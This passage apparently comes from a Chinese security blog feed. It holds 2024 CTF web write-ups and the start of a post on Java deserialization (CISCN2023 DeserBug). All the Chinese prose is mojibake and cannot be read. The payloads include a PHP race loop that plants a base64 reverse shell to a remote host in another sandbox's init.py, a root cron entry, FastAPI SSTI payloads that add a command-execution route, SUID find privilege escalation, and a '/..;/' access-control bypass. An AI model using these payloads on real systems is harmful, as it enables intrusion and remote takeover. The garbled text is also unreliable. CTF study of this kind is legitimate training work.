é™¤æ–‡ä»¶å¤¹çš„æ€§è´¨ï¼Œå°±å¯ä»¥å®ç°åœ¨ä¸€ä¸ªæ²™ç®±é‡Œæ¡ä»¶ç«äº‰ï¼ŒæŠŠå¦ä¸€ä¸ªæ²™ç®±çš„init.pyé‡å†™ï¼Œç„¶åè§¦å‘init.pyã€‚</p><p>æˆ‘æ˜¯ç”¨çš„é‡å†™init.pyåå¼¹shellï¼Œæ‹¿åˆ°www-dataæƒé™ï¼š</p><p>å¼€ä¸ªæ²™ç®±EDDIE123å’ŒEDDIE321ï¼Œåœ¨æ²™ç®±EDDIE123ä¸­æ‰§è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;rm /sandbox/EDDIE321/init.py &amp;&amp; echo &#x27;CmltcG9ydCBvczsKb3MucG9wZW4oImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvdnBzL3BvcnQgMD4mMSciKQ==&#x27; | base64 -d &gt; /sandbox/EDDIE321/init.py&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>while(1)æ˜¯ç”¨ä½œå¾ªç¯ç«äº‰ï¼Œä½¿å¾—init.pyå¿…ç„¶èƒ½é‡å†™ã€‚</p><p>ç„¶ååœ¨EDDIE321ä¸­éšä¾¿æ‰§è¡Œä¸ªechoï¼ŒæŒ‰ç…§ä»£ç é€»è¾‘å°±èƒ½èµ°åˆ°<code>sudo -u www-data python3 init.py</code>ï¼Œä»è€Œå®ç°åå¼¹shellï¼š</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819154938430.png" alt="image-20240819154938430"></p><p>ps -auxå‘ç°rootæƒé™å¼€å¯äº†cronï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æƒ³åˆ°å†™å®šæ—¶ä»»åŠ¡è¿›å»ï¼Œ<code>chmod 777 /flag</code>ç„¶åè¯»å°±å®Œäº‹äº†ã€‚</p><p>é¦–å…ˆæ˜¯æŠŠ&#x2F;etc&#x2F;cron.dä¸å¦å¤–ä¸€ä¸ªæ²™ç®±ï¼ˆè¿™é‡Œæˆ‘è¿˜åˆ›äº†ä¸ªEDDIECRYï¼‰è½¯é“¾æ¥ï¼Œä»è€Œä¸‹é¢åˆ›å»ºphpcodeçš„æ—¶å€™å°±èƒ½æŠŠå®šæ—¶ä»»åŠ¡å†™è¿›å»ã€‚</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819163527316.png" alt="image-20240819163527316"></p><p>å³åœ¨EDDIECRYä¸­å†™å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># &lt;?php system(&#x27;sudo -l&#x27;); ?&gt;</span><br>* * * * * root <span class="hljs-built_in">chmod</span> 777 /flag<br></code></pre></td></tr></table></figure><p>phpcodeå†…å®¹åŠ äº†â¼€å¥php system æ‰§è¡Œ<code>sudo -l</code>, è¿™ä¸ªæ˜¯ä¸ºäº†é˜»å¡è„šæœ¬çš„æ‰§è¡Œ, ä½¿å¾—cronæœ‰è¶³å¤Ÿçš„æ—¶é—´è°ƒåº¦è®¡åˆ’ä»»åŠ¡ã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿè¯•äº†while(1)çš„ç«äº‰ï¼Œä½†æ˜¯å¥½åƒæ•ˆæœä¸å¤ªå¥½emmmï¼Œå…¶å®ä¹Ÿå¯ä»¥å†™<code>&lt;?php sleep(1000);?&gt;</code>è¿™ç§è¾¾åˆ°æ•ˆæœã€‚</p><p>æ­¤å¤„å½“ç„¶ä¹Ÿå¯ä»¥å†æ¬¡åå¼¹shellï¼Œæ‹¿åˆ°çš„å°±æ˜¯rootæƒé™ã€‚</p><p>ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œcat &#x2F;flagå°±å®Œäº†ã€‚</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819163534524.png" alt="image-20240819163534524"></p><h2 id="GoldenHornKing"><a href="#GoldenHornKing" class="headerlink" title="GoldenHornKing"></a>GoldenHornKing</h2><p>fastapiçš„sstiï¼Œä¸å‡ºç½‘ï¼Œè¿‡æ»¤æ•°å­—å’Œ%ï¼Œæ— å›æ˜¾æ‰“å†…å­˜é©¬ã€‚</p><p>å› ä¸ºè¿™é‡Œç”¨çš„æ˜¯fastapiï¼Œæ‰€ä»¥ä¸èƒ½ç”¨add_url_ruleæ·»åŠ å†…å­˜é©¬ï¼Œå¾—ç”¨add_api_routeæ·»åŠ å†…å­˜é©¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> url = <span class="hljs-string">&#x27;http://eci</span><br><span class="hljs-string">2ze870nxuud7kn92ktzy.cloudeci1.ichunqiu.com:8000/calc&#x27;</span><br> <span class="hljs-comment"># url = &#x27;http://127.0.0.1:8000/calc&#x27;</span><br> payload = <br><span class="hljs-string">r&#x27;&#x27;&#x27;app.routes[(dict(e=a)|join|count)].__class__.__init__.__builtins_</span><br><span class="hljs-string"> _[&#x27;eval&#x27;](&quot;app.add_api_route(&#x27;/shell&#x27;, lambda x: </span><br><span class="hljs-string">__import__(&#x27;os&#x27;).popen(x).read())&quot;, &#123;&#x27;app&#x27;:app&#125;)&#x27;&#x27;&#x27;</span><br> resp = requests.get(url, params=&#123;<span class="hljs-string">&#x27;calc_req&#x27;</span>: payload&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br></code></pre></td></tr></table></figure><p>payloadæœ‰å¾ˆå¤šï¼Œä¹Ÿå¯ä»¥ï¼ˆæ¥è‡ª[<a href="https://mp.weixin.qq.com/s/rQj3h-CTakLSMppuz0tCKg">éšæ‰‹åˆ†äº«]2024å·…å³°æå®¢åˆèµ› éƒ¨åˆ†Web (qq.com)</a>ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">undefinded.__class__.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].add_api_route(&#x27;/flag&#x27;,lambda:__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;</span>)<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—® &#x2F;shell?x&#x3D;cat &#x2F;flagå°±å¯ä»¥äº†ã€‚</p><p>è¿™é‡Œå…¶å®è¿˜å¯ä»¥ç”¨é™æ€ç›®å½•çš„æ–¹æ³•ã€‚</p><p>åœ¨ FastAPI ä¸­ï¼Œapp.mount() ç”¨æ¥ä¸ºé™æ€æ–‡ä»¶æŒ‡å®šä¸€ä¸ªè·¯å¾„ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡ app.mount(â€œ&#x2F;staticâ€, StaticFiles(directory&#x3D;â€staticâ€), name&#x3D;â€staticâ€) å°†é™æ€æ–‡ä»¶è·¯å¾„è®¾ç½®ä¸º â€œstaticâ€ ç›®å½•ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•å°†é™æ€æ–‡ä»¶ç›®å½•æ”¹ä¸ºæ ¹ç›®å½•å†è¯»flagï¼Œpayloadæ¥è‡ª<a href="https://mp.weixin.qq.com/s/CTcT5j8wYE0UmcLlMwVPsw">2024å·…å³°æå®¢æŒ‘æˆ˜èµ›â€”WriteUp By EDISEC (qq.com)</a>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app.mount(<span class="hljs-string">&#x27;/static&#x27;</span>, lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;starlette.staticfiles&#x27;</span>).staticfiles.StaticFiles(directory=<span class="hljs-string">&#x27;/&#x27;</span>), name=<span class="hljs-string">&#x27;static&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®<code>&lt;url&gt;/static/flag</code>äº¤äº†ã€‚</p><h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>é»‘ç›’ï¼Œç»™äº†ä¸€ä¸ªbase64çš„ååºåˆ—åŒ–å…¥å£ï¼Œhintæ˜¯jdk17+CBé“¾ã€‚</p><p>å¦‚æœåªæœ‰ä¸ªCBé“¾å½“ç„¶å¾ˆç®€å•ï¼Œå·¥å…·éƒ½èƒ½ä¸€æŠŠæ¢­ã€‚ä½†æ˜¯å¥—äº†ä¸ªjdk17ã€‚</p><p>çœ‹äº†NU1Læˆ˜é˜Ÿçš„wpåï¼Œæ‰çŸ¥é“å®é™…ä¸Šæ–°ç‰ˆæœ¬<code>commons-beanutils</code>â¼€èˆ¬ä¼šåŒæ—¶å¸¦ä¸Š<code>commons collections</code>ã€‚</p><p>è€Œä¸”é¢˜ç›®ä¸å‡ºç½‘ï¼Œæ‰€ä»¥è¦æ‰“ä¸€ä¸ªå†…å­˜é©¬è¿›å»ã€‚</p><p>é¢˜ç›®ä¼šåœ¨ååºåˆ—åŒ–å‰è¿‡æ»¤<code>org.apache</code>å¼€å¤´çš„ç±», ä½†å‘ç°å¯ä»¥ç”¨<code>utf-8 overlong encoding</code>ç»•è¿‡ã€‚</p><p><code>utf-8 overlong encoding</code>å‚è€ƒ:</p><p><a href="https://github.com/qi4L/JYso/blob/master/src/main/java/com/qi4l/jndi/gadgets/utils/utf8OverlongEncoding/UTF8OverlongObjectOutputStream.java">JYso&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;qi4l&#x2F;jndi&#x2F;gadgets&#x2F;utils&#x2F;utf8OverlongEncoding&#x2F;UTF8OverlongObjectOutputStream.java at master Â· qi4L&#x2F;JYso (github.com)</a></p><p>æ‰€ä»¥å¦‚æ­¤æ‰“ä¸ªCCé“¾å°±å‡ºäº†ã€‚</p><p>EXPå¯åœ¨NU1Lå…¬ä¼—å·é‡ŒæŸ¥çœ‹ï¼Œè¿™é‡Œå°±ä¸ç»™å‡ºäº†ã€‚</p><h2 id="admin-Test"><a href="#admin-Test" class="headerlink" title="admin_Test"></a>admin_Test</h2><p>å‰å°å¯ä»¥å¼±å¯†ç <code>admin/qwe123!@#</code>ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥ç›´æ¥ç»•äº†ã€‚</p><p>è®¿é—®&#x2F;admin.htmlå¯ä»¥ç›´æ¥æ‹¿åˆ°æ–‡ä»¶ä¸Šä¼ çš„æ“ä½œé¡µé¢ï¼š</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819174151906.png" alt="image-20240819174151906"></p><p>fuzzä¸€ä¸‹æ‰§è¡Œå‘½ä»¤å¤„çš„banä½ï¼Œå‘ç°å¯ç”¨å­—ç¬¦ä¸ºtã€*ã€.ã€&#x2F;ä»¥åŠå„ç§æ•°å­—ã€‚</p><p>è¿™é‡Œå®¹æ˜“æƒ³åˆ°ä¸´æ—¶æ–‡ä»¶æ‰§è¡Œï¼Œç”¨åˆ°<code>./t*/*</code>çš„payloadï¼Œç›´æ¥å°±å‡ºäº†ã€‚</p><p>æ¯”å¦‚ä¸Šä¼ ä¸€ä¸ª1.pngï¼Œå†…å®¹ä¸º</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤å¤„ä½¿ç”¨<code>./t*/*</code>ï¼Œå‘ç°æƒé™ä¸ºctfã€‚</p><p>å¦‚æ³•ç‚®åˆ¶ï¼Œsuidææƒå‘ç°findå¯ç”¨ï¼Œç›´æ¥findææƒäº¤äº†ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">touch</span> /tmp/test &amp;&amp; find /tmp/test -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /flag \;<br></code></pre></td></tr></table></figure><h2 id="old-api"><a href="#old-api" class="headerlink" title="old_api"></a>old_api</h2><p>åˆæ˜¯jdk17ã€‚</p><p>è¿™é“å…¶å®æŒºå¯æƒœçš„ï¼Œå­¦é•¿çš„æœ¬åœ°dockeré€šäº†ï¼Œä½†æ˜¯è¿œç¨‹ä¸å‡ºç½‘ï¼Œæ²¡æ¥å¾—åŠå†™å†…å­˜é©¬ï¼Œæ‰€ä»¥æ²¡äº¤ä¸Šã€‚</p><p>ç»™äº†c3p0å’Œh2çš„ä¾èµ–ï¼Œæºç é‡å¾ˆå¤§ï¼Œè®¿é—®é¡µé¢ä¹Ÿå°±æ˜¯apiæ“ä½œé¡µé¢ï¼Œå®¡è®¡æºç å‘ç°v1çš„AdminController#importPostå­˜åœ¨readObjectï¼Œè¿™é‡Œåº”è¯¥å°±æ˜¯ååºåˆ—åŒ–å…¥å£ç‚¹ã€‚</p><p><img src="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/image-20240819175127207.png" alt="image-20240819175127207"></p><p>ç»“åˆé¢˜ç›®ä¿¡æ¯ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°è¿™é“é¢˜ä¸¤ä¸ªæ­¥éª¤ï¼Œç¬¬ä¸€æ­¥æ˜¯ç»•è¿‡v2è®¿é—®åˆ°v1çš„è¿™ä¸ªæ–¹æ³•è§¦å‘readObjectï¼Œç¬¬äºŒæ­¥æ˜¯æ‰“H2çš„jdbcååºåˆ—åŒ–ï¼Œè¿™é‡Œç”¨çš„å°±æ˜¯Jackson-h2çš„é“¾å­ã€‚</p><p>è€Œä¸”jdk17ä¸€èˆ¬æ¥è¯´éƒ½æ˜¯å‡ºçš„JDBCæ‰“æ³•ï¼Œä»å‡ ä¸ªæœˆå‰çš„AliyunCTF-Chain17å°±å¯è§ä¸€æ–‘ã€‚</p><p>ç¬¬ä¸€æ­¥ç»•è¿‡ä¹Ÿä¸ç®—å¤ªéš¾ï¼Œ21çº§çš„SEå­¦é•¿ç»™å‡ºäº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>base = <span class="hljs-string">&quot;http://localhost:8081/&quot;</span><br><br>session = requests.Session()<br><br>r = session.post(base + <span class="hljs-string">&quot;/public/register&quot;</span>, data=&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(r.status_code)<br><br>r = session.post(base + <span class="hljs-string">&quot;/public/login&quot;</span>, data=&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(r.status_code)<br><br>r = session.post(base + <span class="hljs-string">&quot;/..;/v1/admin/post/import&quot;</span>, data=&#123;<br>    <span class="hljs-string">&quot;stream&quot;</span>: <span class="hljs-string">&quot;Sakura&quot;</span><br>&#125;)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯ç”¨<code>/..;/v1/admin/post/import</code>å¯ä»¥ç»•è¿‡ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯Jackson + H2çš„JDBCæ‰‹æ³•ã€‚</p><p>ï¼ˆæœªå®Œå¾…ç»­ï¼‰</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>javaå®æˆ˜-é‡èµ°å…«åä¸€éš¾</title>
    <link href="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/"/>
    <url>/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»¥å‰javaåŸºç¡€ä¸ç‰¢ï¼Œåªèƒ½AWDPä¿®ä¸€ä¿®ï¼Œç°åœ¨å­¦çš„ä¸ªä¸ƒä¸ƒå…«å…«äº†ï¼Œè¿˜å¾—åˆºåˆ€è§çº¢ã€‚</p><p>ä»¥å‰åšè¿‡å‡ ä¸ªjavaï¼Œä½†æ˜¯åŸºæœ¬éƒ½æ˜¯æŠ„expï¼Œæ²¡æœ‰ä»€ä¹ˆgadgetçš„è®¤çŸ¥ï¼Œè¿™æ¬¡é‡èµ°å…«åä¸€éš¾ï¼Œå¿…è¯è©æé‡‘èº«ã€‚</p><h2 id="CISCN2023-åˆèµ›-DeserBug"><a href="#CISCN2023-åˆèµ›-DeserBug" class="headerlink" title="[CISCN2023 åˆèµ›]-DeserBug"></a>[CISCN2023 åˆèµ›]-DeserBug</h2><p>ç®—æˆ‘çš„javaååºåˆ—åŒ–å¯è’™é¢˜ä¹‹ä¸€ã€‚è¿™é“é¢˜æ˜¯å½“å¹´çš„åˆèµ›é¢˜ç›®ï¼Œç°åœ¨çœ‹æ¥éš¾åº¦ä¸ç®—å¤ªé«˜ã€‚</p><p>hintï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept<br></code></pre></td></tr></table></figure><p>é™„ä»¶é™¤äº†DeserBugç¯å¢ƒjaråŒ…ï¼Œè¿˜ç»™äº†commons-collections-3.2.2å’Œhutool-5.8.18çš„jaråŒ…ã€‚</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯CCé“¾è‡ª3.2.1åæ–°æ·»åŠ äº†checkUnsafeSerializationåŠŸèƒ½å¯¹ååºåˆ—åŒ–å†…å®¹è¿›è¡Œæ£€æµ‹ï¼Œè€ŒCCé“¾å¸¸ç”¨åˆ°çš„InvokerTransformerå°±åˆ—å…¥äº†é»‘åå•ä¸­ã€‚æ‰€ä»¥ç›´æ¥æ‰“CCé“¾è‚¯å®šä¸è¡Œã€‚</p><p>è€Œä¸”é¢˜ç›®æç¤ºäº†ä»<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code>çš„éƒ¨åˆ†gadgetï¼Œé‚£æˆ‘ä»¬å°±å´ä¹‹ä¸æ­äº†ã€‚</p><p>é¦–å…ˆçœ‹çœ‹é¢˜ç›®å•¥ç©æ„ï¼ŒTestapp.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.app;<br><br><span class="hljs-keyword">import</span> cn.hutool.http.ContentType;<br><span class="hljs-keyword">import</span> cn.hutool.http.HttpUtil;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Testapp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Testapp</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        HttpUtil.createServer(<span class="hljs-number">8888</span>).addAction(<span class="hljs-string">&quot;/&quot;</span>, (request, response) -&gt; &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">bugstr</span> <span class="hljs-operator">=</span> request.getParam(<span class="hljs-string">&quot;bugstr&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (bugstr == <span class="hljs-literal">null</span>) &#123;<br>                response.write(<span class="hljs-string">&quot;welcome,plz give me bugstr&quot;</span>, ContentType.TEXT_PLAIN.toString());<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(bugstr);<br>                <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decode));<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> inputStream.readObject();<br>                result = object.toString();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br>                <span class="hljs-type">Exception</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var8;<br>                <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>                myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;);<br>                myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;e.toString()&#125;);<br>                myexpect.setTargetclass(e.getClass());<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    result = myexpect.getAnyexcept().toString();<br>                &#125; <span class="hljs-keyword">catch</span> (Exception var7) &#123;<br>                    <span class="hljs-type">Exception</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> var7;<br>                    result = ex.toString();<br>                &#125;<br>            &#125;<br><br>            response.write(result, ContentType.TEXT_PLAIN.toString());<br>        &#125;).start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼ å‚<code>bugstr</code>ï¼Œå€¼ä¸ºbase64ç¼–ç åçš„åºåˆ—åŒ–å­—èŠ‚ï¼Œæ‰“ååºåˆ—åŒ–çš„ä½ç½®ä¹Ÿå¾ˆæ˜¾ç„¶ï¼Œä¹Ÿæ²¡é‡å†™ObjectInputStreamè¿™ç§åŠ WAFã€‚</p><p>ç°åœ¨å°±åªéœ€è¦æŠŠé“¾å­åˆ†æå‡ºæ¥å°±å¯ä»¥äº†ã€‚</p><h3 id="å‰åŠç¼åˆ-CC6"><a href="#å‰åŠç¼åˆ-CC6" class="headerlink" title="å‰åŠç¼åˆ-CC6"></a>å‰åŠç¼åˆ-CC6</h3><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œæ¥åˆ°ï¼š</p><p><code>cn.hutool.json.JSONObject.put</code>ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813000442240.png" alt="image-20240813000442240"></p><p>æ²¡å•¥ç‰¹æ®Šï¼Œå°±ä¸€ä¸ªæ™®é€šçš„é”®å€¼å¯¹èµ‹å€¼ã€‚</p><p>å…¶å®å¯ä»¥ç»“åˆCCé“¾ä¾èµ–æƒ³åˆ°CC6çš„lazymap.get()ç»å…¸æ–¹æ³•ï¼ˆå…¶å®CC3ä¹Ÿæ˜¯CC6æ”¹è‰¯è€Œæ¥çš„ï¼‰ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813002641896.png" alt="image-20240813002641896"></p><p>ä¸å¦¨è®¾æƒ³ä¸€ä¸‹ï¼Œå¦‚æœ</p><ul><li>super.mapæ˜¯ä¸€ä¸ªJSONObject</li><li>keyæ— æ‰€è°“</li><li>valueæ˜¯ä¸€ä¸ªTransformerçš„å­ç±»,å¦‚<code>ConstantTransformer</code></li></ul><p>å¦‚å…¶æ‰€ç¤ºï¼Œåªè¦iConstantæ˜¯ä¸ªObjectï¼Œæˆ‘ä»¬å°±èƒ½è°ƒç”¨ä»–çš„getteræ–¹æ³•ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813003154650.png" alt="image-20240813003154650"></p><p>åªè¦ä»¤ä¼ å…¥çš„mapä¸ºJSONObjectå³å¯è§¦å‘JSONObject#putï¼Œä¸Šé¢çš„åˆ†æå·²ç»å¾—çŸ¥valueçš„å€¼ä¹Ÿæ˜¯æˆ‘ä»¬é€šè¿‡ConstantTransformerå¯æ§çš„ï¼Œç”±æ­¤è°ƒç”¨åˆ°å®ƒçš„getteræ–¹æ³•ã€‚</p><p>é‚£ä¹ˆè¿™æ¡é“¾å­çš„å‰åŠéƒ¨åˆ†å°±é€šäº†ï¼ˆCC6ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject() =&gt;<br>HashSet#readObject() =&gt;<br>HashMap#put() =&gt;<br>HashMap#hash() =&gt;<br>TiedMapEntry#hashCode() =&gt;<br>TiedMapEntry#getValue() =&gt;<br>LazyMap#get() =&gt;<br>cn.hutool.json.JSONObject.put<br></code></pre></td></tr></table></figure><h3 id="ååŠç¼åˆ-CC3"><a href="#ååŠç¼åˆ-CC3" class="headerlink" title="ååŠç¼åˆ-CC3"></a>ååŠç¼åˆ-CC3</h3><p>çœ‹çœ‹å¦ä¸€ä¸ªï¼š</p><p><code>com.app.Myexpect#getAnyexcept</code>ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813000748313.png" alt="image-20240813000748313"></p><p>ä½¿ç”¨ä¸€ä¸ªæ„é€ å™¨ï¼Œè§¦å‘å¯¹åº”ç±»çš„newInstance()æ–¹æ³•ã€‚</p><p>æ¬¸ï¼Ÿè¿™ä¸CC3å—ï¼Ÿèƒ½ç›´æ¥è”æƒ³åˆ°<code>TrAXFilter</code>ã€‚</p><p>LINKï¼š<a href="https://eddiemurphy89.github.io/2024/07/28/Commons-Collections/#CC3">Commons Collections - EddieMurphyâ€™s blog (eddiemurphy89.github.io)</a></p><p><img 